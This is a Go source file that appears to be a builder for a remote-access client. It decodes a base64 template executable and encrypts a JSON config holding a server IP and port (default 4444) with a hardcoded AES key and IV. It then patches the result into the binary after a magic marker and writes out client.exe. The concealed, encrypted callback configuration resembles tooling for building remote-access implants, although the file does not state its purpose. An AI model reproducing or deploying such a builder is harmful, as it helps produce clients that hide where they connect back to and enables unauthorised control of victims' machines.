package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
)

func main() {
	ip := flag.String("ip", "127.0.0.1", "Server IP address")
	port := flag.Int("port", 4444, "Server Port")
	flag.Parse()

	// Read binary from base64.txt
	b64Data, err := ioutil.ReadFile("base64.txt")
	if err != nil {
		fmt.Printf("Error reading base64.txt: %v\n", err)
		os.Exit(1)
	}

	exeData, err := base64.StdEncoding.DecodeString(string(b64Data))
	if err != nil {
		fmt.Printf("Error decoding base64: %v\n", err)
		os.Exit(1)
	}

	// Prepare config
	config := map[string]interface{}{
		"ip":   *ip,
		"port": *port,
	}
	configBytes, _ := json.Marshal(config)

	// Encrypt config
	key := []byte("B4A7E9C2D5F8A1B3C6E9D2F5A8B1C4D7")
	iv := []byte("A1B2C3D4E5F6A7B8")

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	// Pad config to 2032 bytes (Zero padding)
	paddedConfig := make([]byte, 2032)
	copy(paddedConfig, configBytes)

	encryptedConfig := make([]byte, len(paddedConfig))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(encryptedConfig, paddedConfig)

	// Search for marker
	marker := []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC}

	// Ensure the marker exists exactly once
	count := bytes.Count(exeData, marker)
	if count == 0 {
		fmt.Println("Error: Marker not found in binary")
		os.Exit(1)
	}
	if count > 1 {
		fmt.Printf("Error: Marker found %d times, binary is ambiguous\n", count)
		os.Exit(1)
	}

	index := bytes.Index(exeData, marker)

	// Patch binary
	copy(exeData[index+16:], encryptedConfig)

	// Output patched binary to client.exe
	err = ioutil.WriteFile("client.exe", exeData, 0644)
	if err != nil {
		fmt.Printf("Error writing client.exe: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("Build successful: client.exe")
}
